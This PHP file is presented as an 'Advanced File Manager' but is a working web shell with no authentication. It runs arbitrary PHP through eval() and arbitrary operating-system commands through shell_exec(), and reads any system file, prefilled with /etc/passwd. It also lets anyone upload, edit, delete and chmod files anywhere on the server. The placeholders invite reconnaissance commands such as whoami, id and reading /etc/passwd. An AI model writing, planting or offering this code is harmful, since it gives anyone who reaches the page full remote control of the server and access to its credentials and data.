<?php
// 🚀 Advanced File Manager - Fixed Navigation Edition
session_start();

// No password - direct access
$_SESSION['auth'] = true;

// Get current directory - preserve it across operations
$dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();

// Handle rename - stay in same directory
if (isset($_GET['rename']) && isset($_GET['newname'])) {
    $old = $_GET['rename'];
    $new = dirname($old) . '/' . basename($_GET['newname']);
    if (rename($old, $new)) {
        echo "✅ Renamed to " . htmlspecialchars(basename($_GET['newname'])) . "<br>";
    } else {
        echo "❌ Rename failed<br>";
    }
    // Stay in same directory
    header("Location: ?dir=" . urlencode($dir));
    exit;
}

// Handle delete - stay in same directory
if (isset($_GET['delete'])) {
    $file = $_GET['delete'];
    $success = false;
    if (is_file($file)) {
        if (unlink($file)) $success = true;
    } elseif (is_dir($file)) {
        // Try to delete recursively if directory not empty
        if (rmdir($file)) {
            $success = true;
        } else {
            // Attempt recursive delete for non-empty directories
            function delTree($path) {
                if (is_dir($path)) {
                    $files = scandir($path);
                    foreach ($files as $file) {
                        if ($file != "." && $file != "..") {
                            delTree($path . "/" . $file);
                        }
                    }
                    rmdir($path);
                } else {
                    unlink($path);
                }
            }
            delTree($file);
            $success = true;
        }
    }
    
    if ($success) {
        echo "✅ Deleted: " . htmlspecialchars(basename($file)) . "<br>";
    } else {
        echo "❌ Delete failed<br>";
    }
    
    // Stay in same directory
    header("Location: ?dir=" . urlencode($dir));
    exit;
}

// Handle chmod - stay in same directory
if (isset($_GET['chmod']) && isset($_GET['perms'])) {
    $file = $_GET['chmod'];
    $perms = octdec($_GET['perms']);
    if (chmod($file, $perms)) {
        echo "✅ Chmod " . decoct($perms) . " applied to " . htmlspecialchars(basename($file)) . "<br>";
    } else {
        echo "❌ Chmod failed<br>";
    }
    header("Location: ?dir=" . urlencode($dir));
    exit;
}

// Handle view file (read without edit)
if (isset($_GET['view'])) {
    $file = $_GET['view'];
    if (file_exists($file) && is_file($file)) {
        echo "<hr><strong>📄 Viewing: " . htmlspecialchars($file) . "</strong><br>";
        echo "<pre style='background:#f0f0f0;padding:10px;border:1px solid #ccc;overflow:auto;max-height:400px'>";
        echo htmlspecialchars(file_get_contents($file));
        echo "</pre><hr>";
        echo "<a href='?dir=" . urlencode($dir) . "'>← Back to directory</a>";
    } else {
        echo "❌ File not found<br>";
        echo "<a href='?dir=" . urlencode($dir) . "'>← Back to directory</a>";
    }
    exit;
}

// Handle read system file
if (isset($_POST['read_system'])) {
    $sysfile = $_POST['system_file'];
    if (file_exists($sysfile) && is_readable($sysfile)) {
        echo "<hr><strong>📖 System File: " . htmlspecialchars($sysfile) . "</strong><br>";
        echo "<pre style='background:#f0f0f0;padding:10px;border:1px solid #ccc;overflow:auto;max-height:400px'>";
        echo htmlspecialchars(file_get_contents($sysfile));
        echo "</pre><hr>";
    } else {
        echo "❌ Cannot read: " . htmlspecialchars($sysfile) . "<br>";
    }
    echo "<a href='?dir=" . urlencode($dir) . "'>← Back to directory</a>";
    exit;
}

// Handle PHP code execution - stay in same directory
if (isset($_POST['execute_code'])) {
    $code = $_POST['execute_code'];
    echo "<hr><strong>⚡ PHP Execution Output:</strong><br>";
    echo "<div style='background:#ffffcc;padding:10px;border:1px solid #ff9900;margin:5px 0;font-family:monospace'>";
    try {
        eval($code);
    } catch (Throwable $e) {
        echo "Error: " . $e->getMessage();
    }
    echo "</div><hr>";
    echo "<a href='?dir=" . urlencode($dir) . "'>← Back to directory</a>";
    exit;
}

// Handle system command - stay in same directory
if (isset($_POST['system_cmd'])) {
    $cmd = $_POST['system_cmd'];
    echo "<hr><strong>💻 Command Output:</strong><br>";
    echo "<pre style='background:#e0e0e0;padding:10px;border:1px solid #888;overflow:auto;max-height:300px'>";
    echo htmlspecialchars(shell_exec($cmd . " 2>&1"));
    echo "</pre><hr>";
    echo "<a href='?dir=" . urlencode($dir) . "'>← Back to directory</a>";
    exit;
}

// Handle file edit - stay in same directory after save
if (isset($_GET['edit'])) {
    $file = $_GET['edit'];
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['content'])) {
        file_put_contents($file, $_POST['content']);
        echo "✅ Saved!<br>";
        echo "<a href='?dir=" . urlencode($dir) . "'>← Back to directory</a><br><br>";
    }
    echo '<form method="POST"><textarea name="content" style="width:100%;height:400px;font-family:monospace">' . htmlspecialchars(file_get_contents($file)) . '</textarea><br><input type="submit" value="Save Changes"/></form>';
    if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
        echo '<a href="?dir=' . urlencode($dir) . '">← Back to directory</a>';
    }
    exit;
}

// Handle download
if (isset($_GET['download'])) {
    $file = $_GET['download'];
    header('Content-Disposition: attachment; filename="' . basename($file) . '"');
    header('Content-Type: application/octet-stream');
    readfile($file);
    exit;
}

// Handle upload - stay in same directory
if (isset($_FILES['file'])) {
    $target = $dir . '/' . basename($_FILES['file']['name']);
    if (move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
        echo "✅ Uploaded: " . htmlspecialchars(basename($target)) . "<br>";
    } else {
        echo "❌ Upload failed<br>";
    }
    header("Location: ?dir=" . urlencode($dir));
    exit;
}

// Handle create new file/dir - stay in same directory
if (isset($_POST['create_item'])) {
    $newpath = $dir . '/' . basename($_POST['new_name']);
    if ($_POST['item_type'] === 'file') {
        if (file_put_contents($newpath, '')) {
            echo "✅ Created file: " . htmlspecialchars(basename($_POST['new_name'])) . "<br>";
        } else {
            echo "❌ Failed to create file<br>";
        }
    } elseif ($_POST['item_type'] === 'dir') {
        if (mkdir($newpath)) {
            echo "✅ Created directory: " . htmlspecialchars(basename($_POST['new_name'])) . "<br>";
        } else {
            echo "❌ Failed to create directory<br>";
        }
    }
    header("Location: ?dir=" . urlencode($dir));
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>File Manager</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
        .container { max-width: 1400px; margin: auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        .toolbar { background: #f0f0f0; padding: 10px; margin: 10px 0; border-radius: 5px; }
        .section { margin: 15px 0; padding: 15px; border: 1px solid #ddd; border-radius: 5px; background: #fafafa; }
        .file-table { width: 100%; border-collapse: collapse; margin-top: 10px; }
        .file-table tr:hover { background: #f9f9f9; }
        .file-table td, .file-table th { padding: 8px; border-bottom: 1px solid #eee; text-align: left; }
        .dir-link { color: #0066cc; font-weight: bold; text-decoration: none; }
        .dir-link:hover { text-decoration: underline; }
        .actions form { display: inline; margin: 0 2px; }
        .actions input, .actions button { font-size: 12px; padding: 2px 5px; }
        .breadcrumb { margin: 10px 0; padding: 8px; background: #e8f4f8; border-radius: 4px; }
        button, input[type="submit"] { background: #4CAF50; color: white; border: none; padding: 5px 10px; border-radius: 3px; cursor: pointer; }
        button:hover, input[type="submit"]:hover { background: #45a049; }
        .delete-btn { color: red; }
        textarea { font-family: monospace; }
    </style>
</head>
<body>
<div class="container">
    <h2>📁 Advanced File Manager</h2>
    
    <!-- Current Directory Display -->
    <div class="toolbar">
        <strong>📍 Current Path:</strong> 
        <?php
        $parts = explode('/', str_replace('\\', '/', $dir));
        $path = '';
        echo "<a href='?dir=" . urlencode(getcwd()) . "'>🏠 Home</a> / ";
        foreach($parts as $i => $p) {
            if(empty($p)) continue;
            $path .= '/' . $p;
            if($i == count($parts)-1) {
                echo "<strong>" . htmlspecialchars($p) . "</strong>";
            } else {
                echo "<a href='?dir=" . urlencode($path) . "'>" . htmlspecialchars($p) . "</a> / ";
            }
        }
        ?>
    </div>
    
    <!-- Quick Access Buttons -->
    <div class="section" style="background:#e8f5e9">
        <strong>⚡ Quick Access:</strong>
        <a href="?dir=<?php echo urlencode(getcwd()); ?>">🏠 Root</a> |
        <a href="?dir=/">💻 System Root</a> |
        <a href="?dir=/var/www/html">🌐 Web Root</a> |
        <a href="?dir=/etc">⚙️ /etc</a> |
        <a href="?dir=/home">👤 /home</a> |
        <a href="?dir=/tmp">📦 /tmp</a>
    </div>
    
    <!-- Upload Form -->
    <div class="section">
        <form method="POST" enctype="multipart/form-data">
            <strong>📤 Upload File:</strong>
            <input type="file" name="file" required>
            <input type="submit" value="Upload to Current Directory">
        </form>
    </div>
    
    <!-- Create Form -->
    <div class="section">
        <form method="POST">
            <strong>➕ Create New:</strong>
            <input type="text" name="new_name" placeholder="name" required size="30">
            <select name="item_type">
                <option value="file">📄 File</option>
                <option value="dir">📁 Directory</option>
            </select>
            <input type="submit" name="create_item" value="Create">
        </form>
    </div>
    
    <!-- System Tools -->
    <div class="section" style="background:#fff3e0">
        <details>
            <summary><strong>🔧 Advanced Tools (Click to Expand)</strong></summary>
            <br>
            
            <!-- System File Reader -->
            <form method="POST" style="margin-bottom:15px">
                <strong>📖 Read System File:</strong>
                <input type="text" name="system_file" value="/etc/passwd" size="50">
                <input type="submit" name="read_system" value="Read File">
            </form>
            
            <!-- PHP Code Execution -->
            <form method="POST" style="margin-bottom:15px">
                <strong>🐘 Execute PHP Code:</strong><br>
                <textarea name="execute_code" rows="3" cols="80" placeholder='echo system("whoami");&#10;echo file_get_contents("/etc/passwd");&#10;phpinfo();'></textarea><br>
                <input type="submit" value="Run PHP Code">
            </form>
            
            <!-- System Command -->
            <form method="POST">
                <strong>💻 System Command:</strong>
                <input type="text" name="system_cmd" size="60" placeholder="ls -la, whoami, id, pwd, uname -a">
                <input type="submit" value="Execute Command">
            </form>
        </details>
    </div>
    
    <!-- File Listing -->
    <h3>📂 Directory Contents:</h3>
    <table class="file-table">
        <thead>
            <tr>
                <th>Type</th><th>Name</th><th>Permissions</th><th>Size</th><th colspan="5">Actions</th>
            </tr>
        </thead>
        <tbody>
        <?php
        $files = scandir($dir);
        foreach ($files as $f) {
            if ($f === '.' || $f === '..') continue;
            $path = $dir . '/' . $f;
            $isDir = is_dir($path);
            $icon = $isDir ? "📁" : "📄";
            $perms = substr(sprintf('%o', fileperms($path)), -4);
            $size = $isDir ? '-' : round(filesize($path)/1024, 2) . ' KB';
            ?>
            <tr>
                <td><?php echo $icon; ?></td>
                <td>
                    <?php if ($isDir): ?>
                        <a href="?dir=<?php echo urlencode($path); ?>" class="dir-link"><?php echo htmlspecialchars($f); ?></a>/
                    <?php else: ?>
                        <?php echo htmlspecialchars($f); ?>
                    <?php endif; ?>
                </td>
                <td style="font-family:monospace; font-size:11px"><?php echo $perms; ?></td>
                <td style="font-size:12px"><?php echo $size; ?></td>
                <td class="actions">
                    <?php if (!$isDir): ?>
                        <a href="?edit=<?php echo urlencode($path); ?>&dir=<?php echo urlencode($dir); ?>">✏️ Edit</a>
                        <a href="?download=<?php echo urlencode($path); ?>">⬇️ Download</a>
                        <a href="?view=<?php echo urlencode($path); ?>&dir=<?php echo urlencode($dir); ?>">👁️ View</a>
                    <?php endif; ?>
                    
                    <form method="GET" style="display:inline">
                        <input type="hidden" name="rename" value="<?php echo htmlspecialchars($path); ?>">
                        <input type="hidden" name="dir" value="<?php echo htmlspecialchars($dir); ?>">
                        <input type="text" name="newname" placeholder="new name" size="10">
                        <button type="submit">Rename</button>
                    </form>
                    
                    <a href="?delete=<?php echo urlencode($path); ?>&dir=<?php echo urlencode($dir); ?>" 
                       class="delete-btn" 
                       onclick="return confirm('⚠️ Delete <?php echo htmlspecialchars($f); ?> permanently?')">🗑️ Delete</a>
                    
                    <form method="GET" style="display:inline">
                        <input type="hidden" name="chmod" value="<?php echo htmlspecialchars($path); ?>">
                        <input type="hidden" name="dir" value="<?php echo htmlspecialchars($dir); ?>">
                        <input type="text" name="perms" placeholder="0755" size="5">
                        <button type="submit">Chmod</button>
                    </form>
                </td>
            </tr>
            <?php
        }
        ?>
        </tbody>
    </table>
    
    <!-- PHP Info Link -->
    <hr>
    <a href="?phpinfo=1" target="_blank">🔧 System Information (phpinfo)</a>
    <?php if (isset($_GET['phpinfo'])) phpinfo(); ?>
</div>
</body>
</html>